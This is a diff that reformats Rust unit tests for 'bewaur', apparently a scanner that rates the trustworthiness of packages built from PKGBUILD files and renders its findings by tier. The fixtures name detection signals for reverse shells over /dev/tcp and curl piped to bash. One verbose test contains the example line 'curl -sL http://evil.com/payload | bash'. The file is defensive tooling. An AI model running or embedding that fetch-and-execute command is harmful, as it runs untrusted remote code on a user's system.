@@ -6,7 +6,13 @@
 use bewaur::shared::output;
 use bewaur::shared::scoring::{ScanResult, Signal, SignalCategory, Tier};
 
-fn make_signal(id: &str, category: SignalCategory, points: u32, description: &str, override_gate: bool) -> Signal {
+fn make_signal(
+    id: &str,
+    category: SignalCategory,
+    points: u32,
+    description: &str,
+    override_gate: bool,
+) -> Signal {
     Signal {
         id: id.to_string(),
         category,
@@ -18,7 +24,14 @@ fn make_signal(id: &str, category: SignalCategory, points: u32, description: &st
     }
 }
 
-fn make_signal_with_line(id: &str, category: SignalCategory, points: u32, description: &str, override_gate: bool, line: &str) -> Signal {
+fn make_signal_with_line(
+    id: &str,
+    category: SignalCategory,
+    points: u32,
+    description: &str,
+    override_gate: bool,
+    line: &str,
+) -> Signal {
     Signal {
         id: id.to_string(),
         category,
@@ -50,11 +63,14 @@ fn trusted_no_signals() {
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: yay (trust: 100/100)
   Trust: TRUSTED
   No negative signals found.
-");
+"
+    );
 }
 
 #[test]
@@ -64,20 +80,35 @@ fn trusted_with_signals() {
         score: 92,
         tier: Tier::Trusted,
         signals: vec![
-            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 10, "Package is less than 6 months old", false),
-            make_signal("M-VOTES-LOW", SignalCategory::Metadata, 5, "Low vote count", false),
+            make_signal(
+                "M-NEW-PACKAGE",
+                SignalCategory::Metadata,
+                10,
+                "Package is less than 6 months old",
+                false,
+            ),
+            make_signal(
+                "M-VOTES-LOW",
+                SignalCategory::Metadata,
+                5,
+                "Low vote count",
+                false,
+            ),
         ],
         override_gate_fired: None,
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: eww (trust: 92/100)
   Trust: TRUSTED
   Negative signals:
        M-NEW-PACKAGE: Package is less than 6 months old
        M-VOTES-LOW: Low vote count
-");
+"
+    );
 }
 
 // ---------- OK ----------
@@ -89,20 +120,35 @@ fn ok_with_signals() {
         score: 70,
         tier: Tier::Ok,
         signals: vec![
-            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 15, "Package is less than 6 months old", false),
-            make_signal("P-WGET-DOWNLOAD", SignalCategory::Pkgbuild, 35, "Downloads file with wget", false),
+            make_signal(
+                "M-NEW-PACKAGE",
+                SignalCategory::Metadata,
+                15,
+                "Package is less than 6 months old",
+                false,
+            ),
+            make_signal(
+                "P-WGET-DOWNLOAD",
+                SignalCategory::Pkgbuild,
+                35,
+                "Downloads file with wget",
+                false,
+            ),
         ],
         override_gate_fired: None,
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: some-tool (trust: 70/100)
   Trust: OK
   Negative signals:
        M-NEW-PACKAGE: Package is less than 6 months old
      ! P-WGET-DOWNLOAD: Downloads file with wget
-");
+"
+    );
 }
 
 // ---------- SKETCHY ----------
@@ -114,20 +160,35 @@ fn sketchy_with_signals() {
         score: 50,
         tier: Tier::Sketchy,
         signals: vec![
-            make_signal("P-EVAL-BASE64", SignalCategory::Pkgbuild, 60, "Base64-encoded eval block", false),
-            make_signal("M-VOTES-ZERO", SignalCategory::Metadata, 20, "Zero votes", false),
+            make_signal(
+                "P-EVAL-BASE64",
+                SignalCategory::Pkgbuild,
+                60,
+                "Base64-encoded eval block",
+                false,
+            ),
+            make_signal(
+                "M-VOTES-ZERO",
+                SignalCategory::Metadata,
+                20,
+                "Zero votes",
+                false,
+            ),
         ],
         override_gate_fired: None,
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: sketchy-pkg (trust: 50/100)
   Trust: SKETCHY
   Negative signals:
     !! P-EVAL-BASE64: Base64-encoded eval block
        M-VOTES-ZERO: Zero votes
-");
+"
+    );
 }
 
 // ---------- SUSPICIOUS ----------
@@ -139,22 +200,43 @@ fn suspicious_with_signals() {
         score: 30,
         tier: Tier::Suspicious,
         signals: vec![
-            make_signal("P-SYSTEMD-CREATE", SignalCategory::Pkgbuild, 45, "Creates systemd service", false),
-            make_signal("P-SYSINFO-RECON", SignalCategory::Pkgbuild, 40, "System reconnaissance commands", false),
-            make_signal("B-NAME-IMPERSONATE", SignalCategory::Behavioral, 65, "Name impersonates popular package", false),
+            make_signal(
+                "P-SYSTEMD-CREATE",
+                SignalCategory::Pkgbuild,
+                45,
+                "Creates systemd service",
+                false,
+            ),
+            make_signal(
+                "P-SYSINFO-RECON",
+                SignalCategory::Pkgbuild,
+                40,
+                "System reconnaissance commands",
+                false,
+            ),
+            make_signal(
+                "B-NAME-IMPERSONATE",
+                SignalCategory::Behavioral,
+                65,
+                "Name impersonates popular package",
+                false,
+            ),
         ],
         override_gate_fired: None,
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: shady-bin (trust: 30/100)
   Trust: SUSPICIOUS
   Negative signals:
      ! P-SYSTEMD-CREATE: Creates systemd service
      ! P-SYSINFO-RECON: System reconnaissance commands
     !! B-NAME-IMPERSONATE: Name impersonates popular package
-");
+"
+    );
 }
 
 // ---------- MALICIOUS ----------
@@ -166,21 +248,36 @@ fn malicious_with_override_gate() {
         score: 5,
         tier: Tier::Malicious,
         signals: vec![
-            make_signal("P-CURL-PIPE", SignalCategory::Pkgbuild, 90, "curl piped to bash", true),
-            make_signal("P-RAW-IP-URL", SignalCategory::Pkgbuild, 30, "Source URL uses raw IP address", false),
+            make_signal(
+                "P-CURL-PIPE",
+                SignalCategory::Pkgbuild,
+                90,
+                "curl piped to bash",
+                true,
+            ),
+            make_signal(
+                "P-RAW-IP-URL",
+                SignalCategory::Pkgbuild,
+                30,
+                "Source URL uses raw IP address",
+                false,
+            ),
         ],
         override_gate_fired: Some("P-CURL-PIPE".to_string()),
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: evil-tool (trust: 5/100)
   Trust: MALICIOUS
   !! Override gate fired: P-CURL-PIPE
   Negative signals:
     !! P-CURL-PIPE: curl piped to bash
      ! P-RAW-IP-URL: Source URL uses raw IP address
-");
+"
+    );
 }
 
 #[test]
@@ -189,20 +286,27 @@ fn malicious_no_signals_only_gate() {
         package: "backdoor".to_string(),
         score: 10,
         tier: Tier::Malicious,
-        signals: vec![
-            make_signal("P-REVSHELL-DEVTCP", SignalCategory::Pkgbuild, 90, "Reverse shell via /dev/tcp", true),
-        ],
+        signals: vec![make_signal(
+            "P-REVSHELL-DEVTCP",
+            SignalCategory::Pkgbuild,
+            90,
+            "Reverse shell via /dev/tcp",
+            true,
+        )],
         override_gate_fired: Some("P-REVSHELL-DEVTCP".to_string()),
         tier_floor: None,
     };
     let out = render(&result, false);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: backdoor (trust: 10/100)
   Trust: MALICIOUS
   !! Override gate fired: P-REVSHELL-DEVTCP
   Negative signals:
     !! P-REVSHELL-DEVTCP: Reverse shell via /dev/tcp
-");
+"
+    );
 }
 
 // ---------- Verbose mode ----------
@@ -215,16 +319,28 @@ fn verbose_shows_matched_lines() {
         tier: Tier::Sketchy,
         signals: vec![
             make_signal_with_line(
-                "P-CURL-PIPE", SignalCategory::Pkgbuild, 90, "curl piped to bash", true,
+                "P-CURL-PIPE",
+                SignalCategory::Pkgbuild,
+                90,
+                "curl piped to bash",
+                true,
                 "curl -sL http://evil.com/payload | bash",
             ),
-            make_signal("M-VOTES-ZERO", SignalCategory::Metadata, 20, "Zero votes", false),
+            make_signal(
+                "M-VOTES-ZERO",
+                SignalCategory::Metadata,
+                20,
+                "Zero votes",
+                false,
+            ),
         ],
         override_gate_fired: Some("P-CURL-PIPE".to_string()),
         tier_floor: None,
     };
     let out = render(&result, true);
-    assert_eq!(out, "\
+    assert_eq!(
+        out,
+        "\
 bewaur: test-pkg (trust: 45/100)
   Trust: SKETCHY
   !! Override gate fired: P-CURL-PIPE
@@ -232,7 +348,8 @@ bewaur: test-pkg (trust: 45/100)
     !! P-CURL-PIPE: curl piped to bash
          > curl -sL http://evil.com/payload | bash
        M-VOTES-ZERO: Zero votes
-");
+"
+    );
 }
 
 #[test]
@@ -241,9 +358,13 @@ fn verbose_without_matched_line_shows_nothing_extra() {
         package: "test-pkg".to_string(),
         score: 85,
         tier: Tier::Trusted,
-        signals: vec![
-            make_signal("M-NEW-PACKAGE", SignalCategory::Metadata, 10, "Package is less than 6 months old", false),
-        ],
+        signals: vec![make_signal(
+            "M-NEW-PACKAGE",
+            SignalCategory::Metadata,
+            10,
+            "Package is less than 6 months old",
+            false,
+        )],
         override_gate_fired: None,
         tier_floor: None,
     };
@@ -300,7 +421,13 @@ fn signal_prefix_levels() {
             // points >= 60 -> "!!" prefix
             make_signal("HIGH", SignalCategory::Pkgbuild, 60, "high severity", false),
             // points >= 30 -> " !" prefix
-            make_signal("MED", SignalCategory::Behavioral, 30, "medium severity", false),
+            make_signal(
+                "MED",
+                SignalCategory::Behavioral,
+                30,
+                "medium severity",
+                false,
+            ),
             // points < 30 -> "  " prefix
             make_signal("LOW", SignalCategory::Metadata, 10, "low severity", false),
         ],
@@ -309,10 +436,22 @@ fn signal_prefix_levels() {
     };
     let out = render(&result, false);
     // Verify each prefix level
-    assert!(out.contains("    !! GATE: gate signal"), "override gate should have !! prefix");
-    assert!(out.contains("    !! HIGH: high severity"), "high severity should have !! prefix");
-    assert!(out.contains("     ! MED: medium severity"), "medium severity should have  ! prefix");
-    assert!(out.contains("       LOW: low severity"), "low severity should have    prefix");
+    assert!(
+        out.contains("    !! GATE: gate signal"),
+        "override gate should have !! prefix"
+    );
+    assert!(
+        out.contains("    !! HIGH: high severity"),
+        "high severity should have !! prefix"
+    );
+    assert!(
+        out.contains("     ! MED: medium severity"),
+        "medium severity should have  ! prefix"
+    );
+    assert!(
+        out.contains("       LOW: low severity"),
+        "low severity should have    prefix"
+    );
 }
 
 // ---------- Full pipeline e2e (scan_pkgbuild -> write_text) ----------
@@ -324,15 +463,28 @@ fn full_pipeline_trusted_shows_signals() {
     let out = render(&result, false);
 
     // Must show package header
-    assert!(out.contains("bewaur: yay (trust:"), "should show package header");
+    assert!(
+        out.contains("bewaur: yay (trust:"),
+        "should show package header"
+    );
     assert!(out.contains("Trust: TRUSTED"), "should show TRUSTED tier");
 
     // If there are signals, they must be listed (not just a count)
     if !result.signals.is_empty() {
-        assert!(out.contains("Negative signals:"), "signals must be listed, not just counted");
+        assert!(
+            out.contains("Negative signals:"),
+            "signals must be listed, not just counted"
+        );
         for signal in &result.signals {
-            assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
-            assert!(out.contains(&signal.description), "signal description must appear");
+            assert!(
+                out.contains(&signal.id),
+                "signal {} must appear in output",
+                signal.id
+            );
+            assert!(
+                out.contains(&signal.description),
+                "signal description must appear"
+            );
         }
     } else {
         assert!(out.contains("No negative signals found."));
@@ -345,13 +497,23 @@ fn full_pipeline_malicious_shows_all_signals() {
     let result = bewaur::coordinator::scan_pkgbuild("firefox-fix-bin", pkgbuild);
     let out = render(&result, false);
 
-    assert!(out.contains("Trust: MALICIOUS"), "should show MALICIOUS tier");
-    assert!(out.contains("Override gate fired:"), "should show override gate");
+    assert!(
+        out.contains("Trust: MALICIOUS"),
+        "should show MALICIOUS tier"
+    );
+    assert!(
+        out.contains("Override gate fired:"),
+        "should show override gate"
+    );
     assert!(out.contains("Negative signals:"), "signals must be listed");
 
     // Every signal must appear in output
     for signal in &result.signals {
-        assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
+        assert!(
+            out.contains(&signal.id),
+            "signal {} must appear in output",
+            signal.id
+        );
     }
 }
 
